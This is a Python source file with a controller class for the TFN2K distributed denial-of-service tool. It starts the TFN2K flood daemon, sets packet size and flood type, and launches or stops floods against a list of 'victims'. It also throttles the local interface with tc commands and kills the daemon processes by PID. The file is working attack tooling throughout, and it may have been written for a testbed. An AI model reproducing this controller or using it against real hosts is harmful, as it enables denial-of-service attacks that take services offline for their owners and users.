import os
import re
import signal
import socket
import struct
import fcntl
import six


class tfn2k(object):

    def __init__(self, **args):
        self.tfn2kdir = os.path.dirname(
            os.path.realpath(__file__)) + os.path.sep + 'tfn2k' + os.path.sep + 'src' + os.path.sep
        self.phy_interface = args['phy_interface']
        self.bandwidth = args['bandwidth']
        self.packet_size = args['packet_size']
        self.flood_type = args['flood_type']
        self.victims = args['victims']
        self.set_bandwidth()
        self.set_ip_txt()
        self.start_td()
        self.set_package_size()

    def get_ip(self, ethname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # python3
        if six.PY3 == True:
            return socket.inet_ntoa(
                fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', bytes(ethname[:15], encoding='utf-8')))[20:24])
        # python2
        elif six.PY2 == True:
            return socket.inet_ntoa(
                fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', bytes(ethname[:15])))[
                20:24])

    def set_bandwidth(self):
        if self.bandwidth != -1:
            os.system('tc qdisc del dev %s root' % self.phy_interface)
            os.system('tc qdisc add dev %s root handle 1: htb r2q 1' % self.phy_interface)
            os.system('tc class add dev %s parent 1: classid 1:1 htb rate %smbit ceil %smbit' % (self.phy_interface, self.bandwidth, self.bandwidth))
            os.system('tc filter add dev %s parent 1: protocol ip prio 16 u32 match ip dst 0.0.0.0/0 flowid 1:1' % self.phy_interface)
        elif self.bandwidth == -1:
            os.system('tc qdisc del dev %s root' % self.phy_interface)

    def del_bandwidth(self):
        os.system('tc qdisc del dev %s root' % self.phy_interface)

    def set_ip_txt(self):
        myip = self.get_ip(self.phy_interface)
        filename = self.tfn2kdir + 'ip.txt'
        with open(filename, 'w') as f:
            f.writelines(myip)

    def get_flood_type(self):
        return str(int(self.flood_type) + 3)

    def start_td(self):
        cmd = self.tfn2kdir + 'td'
        os.system(cmd)

    def set_package_size(self):
        cmd = self.tfn2kdir + 'tfn -f ' + self.tfn2kdir + 'ip.txt -c 2 -i %s > /dev/null' % self.packet_size
        os.system(cmd)

    # functions that can be called
    def start_tfn2k(self):
        cmd = self.tfn2kdir + 'tfn -f ' + self.tfn2kdir + 'ip.txt -c %s -i %s > /dev/null' % (self.get_flood_type(), self.victims)
        os.system(cmd)

    def stop_tfn2k(self):
        cmd = self.tfn2kdir + 'tfn -f ' + self.tfn2kdir + 'ip.txt -c 0 > /dev/null'
        os.system(cmd)

    def stop_td_and_tfn2k(self):
        tfnpids = os.popen('ps aux | grep -E "tfn-daemon|tfn-child" | grep -v grep')
        tfnpids = tfnpids.read().splitlines()
        for i in tfnpids:
            pid = re.search('\d+', i)
            pid = pid.group()
            try:
                os.kill(int(pid), signal.SIGKILL)
            except OSError:
                continue
        self.del_bandwidth()
